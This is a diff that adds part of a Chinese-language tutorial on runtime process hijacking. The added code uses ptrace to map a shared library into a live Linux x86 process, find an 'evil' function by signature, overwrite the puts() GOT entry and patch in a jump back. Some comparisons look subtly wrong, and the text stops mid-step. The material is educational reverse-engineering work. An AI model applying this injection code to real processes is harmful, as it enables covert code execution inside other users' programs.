@@ -108,7 +108,7 @@ int main(void)
 *   8048330:       ff 25 0c a0 04 08       jmp    *0x804a00c
 *   8048336:       68 18 00 00 00          push   $0x18
 *   804833b:       e9 b0 ff ff ff          jmp    80482f0 <_init+0x18>)
-*   PLT首先间接跳转到*0x804a00c, 0x804a00c是GOT中的条目，当前还没有保存puts函数的真实地址，现在保存的是PLT中的下一条指令(push $0x18)的地址, 0x18是puts函数在重定位表中的偏移，类型为R_386_JUMP_SLOT
+*   PLT首先间接跳转到*0x804a00c, 0x804a00c是GOT中的条目，现在还没有保存puts函数的真实地址，而保存的是PLT中的下一条指令(push $0x18)的地址, 0x18是puts函数在重定位表中的偏移，类型为R_386_JUMP_SLOT
 *
 * localhost hijack$ readelf -r test
 * Relocation section '.rel.dyn' at offset 0x2b0 contains 1 entries:
@@ -654,7 +654,239 @@ int grsec_mmap_library(int pid)
   reg.ebx = offset;
 
   /* MAP IN TEXT RE */
+  ptrace(PTRACE_POKETEXT, pid, offset, 0);
+  ptrace(PTRACE_POKETEXT, pid, offset+4, segment.text_len + (PAGE_SIZE - (segment.text_len & (PAGE_SIZE - 1))));
+  ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);
+  ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);
+  ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);
+  ptrace(PTRACE_POKETEXT, pid, offset + 20, segment.text_off & ~(PAGE_SIZE - 1));
+  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+  ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+
+  for (i=0; i<5; i++)
+  {
+    ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
+    wait(NULL);
+    ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+    if (reg.eax != SYS_mmap)
+      evil_base = reg.eax;
+  }
+
+  reg.eip = sysenter;
+  reg.eax = SYS_mmap;
+  reg.ebx = offset;
+
+  ptrace(PTRACE_POKETEXT, pid, offset, 0);
+  ptrace(PTRACE_POKETEXT, pid, offset + 4, segment.data_len + (PAGE_SIZE - (segment.data_len & (PAGE_SIZE -1))));
+  ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);
+  ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);
+  ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);
+  ptrace(PTRACE_POKETEXT, pid, offset + 20, segment.data_off & ~(PAGE_SIZE -1));
+  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+
+  for(i=0; i<5; i++)
+  {
+    ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
+    wait(NULL);
+  }
+  printf("Restoring data segment\n");
+  for(i=0; i<strlen(library_string) + 32; i++)
+    ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long*)(orig_ds + i));
+  reg.eip = eip;
+  reg.eax = eax;
+  reg.ebx = ebx;
+  reg.ecx = ecx;
+  reg.edx = edx;
+  reg.esp = esp;
+
+  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+  ptrace(PTRACE_DETACH, pid, NULL, NULL);
 
 }
 
+关于获取sysenter的最后一个要点是：
+    另一个定位sysenter的方法是解析进程的栈获取AUXVAT_SYSINFO的入口，这个入口要么包含sysenter的地址或者它附近的地址，我没有尝试过这种方法，我偶然发现这种方法是有可能可行的。
+
+
+Step 9
+
+    为了执行我们的衍生代码，也就是我们的替代函数，我们必须定位被映射到目标进程内存映像的动态库的基地址。进程的内存映像显示在/proc/<pid>/maps中，我们映射的动态库也在其中，因此解析这个文件就足够了，我们的动态库叫"libtest.so.1.0"
+08048000-08049000 r-xp 00000000 08:03 4786267    /home/elf/got_hijack/test
+
+08049000-0804a000 r--p 00000000 08:03 4786267    /home/elf/got_hijack/test
+
+0804a000-0804b000 rw-p 00001000 08:03 4786267    /home/elf/got_hijack/test
+
+b7ddf000-b7de0000 rw-p b7ddf000 00:00 0
+
+b7de0000-b7f0a000 r-xp 00000000 08:03 378946     /lib/libc-2.6.1.so
+
+b7f0a000-b7f0c000 r--p 0012a000 08:03 378946     /lib/libc-2.6.1.so
+
+b7f0c000-b7f0d000 rw-p 0012c000 08:03 378946     /lib/libc-2.6.1.so
+
+b7f0d000-b7f11000 rw-p b7f0d000 00:00 0
+
+
+/* if we do this the grsec way, you want the base of the text */
+
+/* and you will see two mappings for libtest.so.1.0, the text */
+
+/* will be maped as r-xp and the data will be rw-p */
+
+b7f1b000-b7f1d000 rwxp 00000000 08:03 4786297    /home/elf/libtest.so.1.0
+
+b7f1d000-b7f1e000 rw-p b7f1d000 00:00 0
+
+b7f1e000-b7f38000 r-xp 00000000 08:03 378903     /lib/ld-2.6.1.so
+
+b7f38000-b7f39000 r--p 00019000 08:03 378903     /lib/ld-2.6.1.so
+
+b7f39000-b7f3a000 rw-p 0001a000 08:03 378903     /lib/ld-2.6.1.so
+
+bfb24000-bfb39000 rw-p bffeb000 00:00 0          [stack]
+
+ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]
+
+    可以看到基地址为b7f1b000. 一个在hijacker中用到的获取这个地址的简单函数将稍候给出，重点需要注意的是如果内核有grsec补丁，那么这些地址将不能从/proc/<pid>/maps文件中得到，这样我们就必须在mmap动态库之后从eax中获取。
+
+
+Step 10
+    现在我们有动态库的基地址了，我们需要定位其中的evil function从而将它保存到GOT中，同样我们也需要给evil function打补丁，将原函数的地址写到它的转移代码(transfer code)中，这样我们才能从evil function 跳回到原函数。(记住：transfer code 处在evil function的最后，要么是一个jump或者是一个函数指针)
+    一种寻找evil function的方法是扫描内存，通过寻找它的特征代码来找到它，我们可以使用开头的8个字节作为特征代码：
+
+int evilprint(char *buf)
+{
+  char new_string[5];
+  new_string[0] = 'e';
+  new_string[1] = 'v';
+  new_string[2] = 'i';
+  new_string[3] = 'l';
+  new_string[4] = 0;
+
+  int (*origfunc)(char *p) = 0x00000000;
+  origfunc(new_string);
+}
+
+使用objdump我们可以反汇编它并发现它的特征代码
+
+00000248 <evilprint>:
+ 248:   55                      push   %ebp
+ 249:   89 e5                   mov    %esp,%ebp
+ 24b:   83 ec 18                sub    $0x18,%esp
+ 24e:   c6 45 f7 65             movb   $0x65,-0x9(%ebp) 
+ 252:   c6 45 f8 76             movb   $0x76,-0x8(%ebp) 
+ 256:   c6 45 f9 69             movb   $0x69,-0x7(%ebp)
+ 25a:   c6 45 fa 6c             movb   $0x6c,-0x6(%ebp)
+ 25e:   c6 45 fb 00             movb   $0x0,-0x5(%ebp)
+ 262:   c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%ebp)
+ 269:   83 ec 0c                sub    $0xc,%esp
+ 26c:   8d 45 f7                lea    -0x9(%ebp),%eax
+ 26f:   50                      push   %eax
+ 270:   8b 45 fc                mov    -0x4(%ebp),%eax
+ 273:   ff d0                   call   *%eax
+ 275:   83 c4 10                add    $0x10,%esp
+ 278:   c9                      leave
+ 279:   c3                      ret
+
+    开头的3个字节"\x55\x89\xe5"是标准的函数开场白，那么我们用它们来标示一个函数的开始，包含接下来的5个字节也可以。这样我们就有了一个独一无二的特征代码来标示我们的衍生代码在内存中的开始位置。
+
+unsigned char evilsig[] = "\x55\x89\xe5\x83\xec\x18\xc6\x45";
+
+    使用一个大一些的特征代码也许更加明智，但是在我们的例子中动态库非常小从而可以保证开头的8个自己只存在于我们的函数中。为了获取evil function的地址，我们只需要使用ptrace PEEKTEXT来将我们的动态库从进程映像读到buffer中：
+
+for (i=0, j=0; i<size; i+=sizeof(uint32_t), j++)
+{
+  if (((data = ptrace(PTRACE_PEEKTEXT, pid, vaddr + i)) == -1) && errno)
+  {
+    return -1;
+  }
+  buf[j] = data;
+}
+
+然后寻找我们的特征代码：
+for(i = 0; i < LIBSIZE; i++)
+{
+  if (buf[i] == evilsig[0] && buf[i+1]==evilsig[1] && buf[i+2] == evilsig[2] && buf[i+3] == evilsig[3] && buf[i+4] == evilsig[4] && buf[i+5] == buf[i+6] && buf[i+7] == evilsig[7])
+  {
+    evilvaddr = (vaddr + i);
+    break;
+  }
+}
+
+    另一个获取函数地址的方法更加简单也更好，通过找到evil function在动态库中的offset，因为它是静态的，因此 eviladdr = base + offst
+
+
+Step 11-13
+    除了要将GOT entry用evil function的地址覆盖，我们还要将evil function的transfer code用原函数地址打上补丁。如果我们退回去反汇编evil function "evilprint"，我们会发现第9行代码的transfer code需要打补丁：
+262:   c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%ebp)
+
+这行反汇编是由我们C中的函数指针赋值生成的：
+int (*origfunc)(char *p) = 0x00000000;
+
+    我们需要在evil function中定位它并将它用原函数的地址覆盖，我们怎样才能得到原函数了？如果你还记得，在step2中get_plt()函数将会获取重定位条目，这些条目中包含了GOT中的virtual address/offsets，在那里我们能找我们需要的。
+    使用我写的一些代码我们可以获取进程的重定位偏移(relocation offsets)，它们的值和对应的符号(symbol)，我们可以在test程序运行时看一下它的数据：
+
+r_offset: 804a000
+symbol:   __gmon_start__
+export address: 8048306
+
+r_offset: 804a004
+symbol:   __libc_start_main
+export address: b7dd5f00
+
+r_offset: 804a008
+symbol:   sleep
+export address: b7e4dbb0
+
+r_offset: 804a00c
+symbol:   puts
+export address: b7e185c0
+
+    上面显示的是什么？ r_offset(relocation offset:重定位偏移)是GOT中的地址，导出的地址(export address)就保存在那里,如果你注意到puts()的导出地址是b7e185c0，那就是libc中的解析地址(resolved address in libc).我是怎么知道这个的？因为Lazy linking, 在puts()被第一次调用之前，它将包含一个"桩地址"(stub address)，这个"桩地址"指回了PLT,且它以"804"开头.
+
+    因此我们的目标是获取GOT表中puts()的地址r_offset，下面是一个例子：
+if ((lp = (struct linking_info *)get_plt(mem)) == NULL)
+{
+  printf("get_plt() failed\n");
+  goto done;
+}
+for (i = 0; i < lp[0].count; i++)
+{
+  if (strcmp(lp[i].name, "puts") == 0)
+  {
+    /*
+     * memrw() uses ptrace to perform several tasks, including retrieving the original function address from the GOT, and overwriting it with the new function (evilprint) address the memrw() MODIFY_GOT request will return the final value of the GOT entry, which should contain the address of the new function, this way we can check to make sure its been properly updated. 
+     */
+    export = memrw(NULL, lp[i].offset, MODIFY_GOT, pid, evilfunc);
+    if (export == evilfunc)
+      printf("Successfully modified GOT entry\n\n");
+    else
+    {
+      printf("Failed at modifying GOT entry\n");
+      goto done;
+    }
+    printf("New GOT value: %x\n", export);
+  }
+ }
+
+    我们现在已经获取了原函数的地址，并将GOT entry修改为我们的evil function. 我们接下来要进行最后一步并给evil function的transfer code打补丁.我们需要使用memrw()函数(源代码)来读取evil function，然后定位打补丁的地址.
+    记住我们的transfer code 的特征码： c7 45 fc 00 00 00 00, 我们将用原函数地址覆盖"\xc7\x45\xfc"之后的4个"\x00\x00\x00\x00".
+
+unsigned char evil_code[256];
+unsigned long injection_vaddr = 0;
+unsigned char tc[] = "\xc7\x45\xfc\x00";
+memrw((unsigned long *)evil_code, evilfunc, 256, pid, 0);
+for (i=0; i<256; i++)
+{
+  if (evil_code[i] == tc[0] && evil_code[i+1] == tc[1] && evil_code[i+2] == tc[2] && evil_code[i+3] == tc[3])
+  {
+    printf("\n Located transfer code; patching it with %x\n",original);
+    injection_vaddr = (evilfunc + i) + 3;
+    break;
+  }
+}
+
+At this point we can patch it with:
 
